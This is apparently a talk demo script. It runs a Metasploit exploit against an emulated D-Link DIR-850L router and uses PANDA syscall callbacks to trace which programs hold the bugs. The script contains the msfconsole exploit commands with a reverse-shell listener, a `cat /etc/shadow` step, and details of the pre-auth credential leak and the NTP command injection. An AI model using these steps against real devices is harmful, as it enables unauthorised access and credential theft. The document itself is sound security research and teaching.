# Rehosting Demo: DLink DIR-850L Rev A1 with metasploit and PANDA

This is intended to be a five minute demo as part of a talk on whole-system dynamic program analysis.  This is intended to be very basic, there are many more things we could do with this.

Block quotes are suggested talking points for the demonstrator.

The firmware I used was version 'DIR850LA1_FW114WWb07.bin' (available [here](http://files.dlink.com.au/Products/DIR-850L/REV_A/Firmware/Firmware_v1.14B07/DIR850LA1_FW114WWb07.bin))- the rehosting is
not part of this demo.  You are meant to use a docker container.

Some background links on the exploit:
https://ssd-disclosure.com/ssd-advisory-d-link-850l-multiple-vulnerabilities-hack2win-contest/

https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_dir850l_unauth_exec.rb

## Starting the rehosting

> The big idea here is to give you a flavor of analyzing a rehosted system with PANDA and show you what that analysis can look like

Start up container: `./start_container.sh`.  
All commands afterwards are assumed to be in the container
You're going to want a few extra shells, so do `./extra_shell.sh`

Start `./network_config.sh`
> This configures the network so we can talk with the rehosted router

Start the rehosted system (assumes a PyPANDA script run.py for launching the
router):
```
SHOW_OUTPUT=1 ./run.py
```
> The command we just ran starts the emulated router in PANDA.  We can see the standard Linux boot messages and then...

> errors... lots of errors... 
> Q: Where do those errors come from?
> A: We are running this system in emulation without many of its devices, so it is very unhappy
> Again, the goal was to run the system with enough fidelity for security analysis, so we're going to hope this is "good enough"
> What counts for "good enough" is an open research question

Stop run.py
> Stopping the router is like stopping a program, so we can just do that

> What if instead of showing all that console output we just looked at which programs start?
Now, open run.py add the execve callback.  In my demos, I had this read to go with just the decorator commented out.

> Here is code that looks for processes starting as the system runs
```python
@panda.ppp("syscalls2", "on_sys_execve_enter")
def on_sys_execve_enter(cpu, pc, filename_ptr, argv, envp):
    try:
        fname = panda.read_str(cpu, filename_ptr)
    except:
        fname = "(error)"
	print("{fname} started")
```

> Let's watch the processes start up for the entire system. 
Run it for a little bit and close, it's kinda noisy.

> What if we just want to know when a specific program is started? For example, the webserver?
Edit the callback to now include the if statement about "httpd"
```python
@panda.ppp("syscalls2", "on_sys_execve_enter")
def on_sys_execve_enter(cpu, pc, filename_ptr, argv, envp):
    try:
        fname = panda.read_str(cpu, filename_ptr)
    except:
        fname = "(error)"
    if "httpd" in fname:
        print("httpd started: execve(%s,...)" % fname)
```
There are much much better ways to do detect this process starting, but this is intuitive for a broad audience and "just uses python."

Run `./socat.sh` in another terminal and then show the webserver connecting to http://localhost:8000 after the server starts up.
> In our rehosted system, we have configured some networking so it can talk with the host
Feel free to play around with the web interface, it's quite stable. Talk about
how even though we had all of those boot errors at least this seems to work out
okay.

## Running the DIR-850L and metasploit:

Go back to the slides and move to the next slide about metasploit

> Now let's do something a little more interesting

In a separate window Start metasploit: `msfconsole`

The following commands are run in metasploit:
```
use exploit/linux/http/dlink_dir850l_unauth_exec
set rhost 192.168.0.1
set lhost 192.168.0.2
exploit
```

Type in the window, show that you are running commands on the router such as `hostname` and `cat /etc/shadow`

>Okay, that's great. Let's see if we can use dynamic analysis to understand how this exploit works a bit more by figuring out which programs have the bugs

### Digging into the vulnerabilities

#### Credential looting

There are two vulnerabilities used in this metasploit module.  The first is to steal credentials using hedwig.cgi/fatlady.php, which are used to update the configuration settings.  hedwig.cgi is available pre-auth, and will validate any service name you request by loading that php file.  Essentially, we tell it to load `/htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php` and that will output admin accounts.

> To see how the password is stolen, we can look at output from programs.

Before running with the following callback, I like to change the password in the
web UI (under "Tools") so that you can see it in the python output.

```python
@panda.ppp("syscalls2", "on_sys_write_enter")
def on_sys_write_enter(cpu, pc, fd, buf, count):
    pname = panda.get_process_name(cpu)
    try:
        write_data = panda.virtual_memory_read(cpu, buf, count)
    except:
        write_data = b"(error)"

    if b"<password>" in write_data:
        print(f"Password field output by {pname}!:\n---\n{write_data}\n---\n")
```
> We are looking for the xml field containing the password

Output should be something like (highlight the password field):
```
(qemu) Password field written by hedwig.cgi!:
---
b'HTTP/1.1 200 OK\nContent-Type: text/xml\n\n<module>\n\t<service></service>\n\t<device>\n\t\t<gw_name>DIR-850L</gw_name>\n\t\t\n\t\t<account>\n\t\t\t<seqno>1</seqno>\n\t\t\t<max>2</max>\n\t\t\t<count>1</count>\n\t\t\t<entry>\n\t\t\t\t<uid>USR-</uid>\n\t\t\t\t<name>Admin</name>\n\t\t\t\t<usrid></usrid>\n\t\t\t\t<password>supersecret</password>\n\t\t\t\t<group>0</group>\n\t\t\t\t<description></description>\n\t\t\t</entry>\n\t\t</account>\n\t\t<group>\n\t\t\t<seqno></seqno>\n\t\t\t<max></max>\n\t\t\t<count>0</count>\n\t\t</group>\n\t\t<session>\n\t\t\t<captcha>0</captcha>\n\t\t\t<dummy></dummy>\n\t\t\t<timeout>600</timeout>\n\t\t\t<maxsession>128</maxsession>\n\t\t\t<maxauthorized>16</maxauthorized>\n\t\t</session>\n\t</device>\n</module>\n<?xml version="1.0" encoding="utf-8"?>\n<hedwig>\n\t<result>OK</result>\n\t<node></node>\n\t<message>No modules for Hedwig</message>\n</hedwig>\n'
---

Password field written by httpd!:
---
b'HTTP/1.1 200 OK\r\nServer: Linux, HTTP/1.1, DIR-850L Ver 1.14WW\r\nDate: Thu, 26 May 2016 16:07:27 GMT\r\nTransfer-Encoding: chunked\r\nContent-Type: text/xml\r\n\r\n2d5\r\n<module>\n\t<service></service>\n\t<device>\n\t\t<gw_name>DIR-850L</gw_name>\n\t\t\n\t\t<account>\n\t\t\t<seqno>1</seqno>\n\t\t\t<max>2</max>\n\t\t\t<count>1</count>\n\t\t\t<entry>\n\t\t\t\t<uid>USR-</uid>\n\t\t\t\t<name>Admin</name>\n\t\t\t\t<usrid></usrid>\n\t\t\t\t<password>supersecret</password>\n\t\t\t\t<group>0</group>\n\t\t\t\t<description></description>\n\t\t\t</entry>\n\t\t</account>\n\t\t<group>\n\t\t\t<seqno></seqno>\n\t\t\t<max></max>\n\t\t\t<count>0</count>\n\t\t</group>\n\t\t<session>\n\t\t\t<captcha>0</captcha>\n\t\t\t<dummy></dummy>\n\t\t\t<timeout>600</timeout>\n\t\t\t<maxsession>128</maxsession>\n\t\t\t<maxauthorized>16</maxauthorized>\n\t\t</session>\n\t</device>\n</module>\n<?xml version="1.0" encoding="utf-8"?>\n<hedwig>\n\t<result>OK</result>\n\t<node></node>\n\t<message>No modules for Hedwig</message>\n</hedwig>\n\r\n'
---
```

> Sure enough, it's a bug in hedwig.cgi that caused this problem. If we had more time we could do iterative analysis to narrow down where the vulnerability occured
> We just narrowed down which program contains the bug from the dozens of programs we saw running when we were tracking execve


#### RCE

Never had enough time to do this during the live presentation, but if there's plenty, go on to this 

> Passwords aren't usually enough to run commands on a router from the web server. So there's a second bug

> We see that we can run arbitrary programs using commands from metasploit, so let's figure out who's starting those programs

For this one, we'll just use the provided CallTree plugin which will show which programs start others
```python
from pandarepyplugins import CallTree
panda.pyplugins.load(CallTree)
```
Pause the output, discuss some of this

> We can see this is very noisy
In the exploit reverse shell, type something like `AAAAAAAAAAAAAAAAAAAAAA`

Then search the CallTree output for something like this:
```
init (1) -> ntp_run.sh (4349) -> sh (4359) -> sh (5495) => AAAAAAAAAAAAAAAAAAAAAAA
```

We see that our nonexistent program `AAAAAAAAAAAAAAAAAAAAAAA` is called by ntp_run.sh

Added detail from web reference above: the time server configuration script passes the server parameter straight to ntpclient when executing:
```
[ /etc/services/DEVICE.TIME.php ]
   163	$enable = query("/device/time/ntp/enable");
   164	if($enable=="") $enable = 0;
   165	$enablev6 = query("/device/time/ntp6/enable");
   166	if($enablev6=="") $enablev6 = 0;
   167	$server = query("/device/time/ntp/server");
   ...
   172	if ($enable==1 && $enablev6==1)
   ...
   184				'SERVER4='.$server.'\n'.
   ...
   189				'	ntpclient -h $SERVER4 -i 5 -s -4 > /dev/console\n'.
```

> Now that we know which programs have the bugs, we can refine our dynamic analysis iteratively to get addresses where the bugs occur and then we could supplement with static analysis.  Please understand this is over-simplified analyses, it's just meant to give the flavor of how high-level thinking can be applied to whole-system dynamic analysis
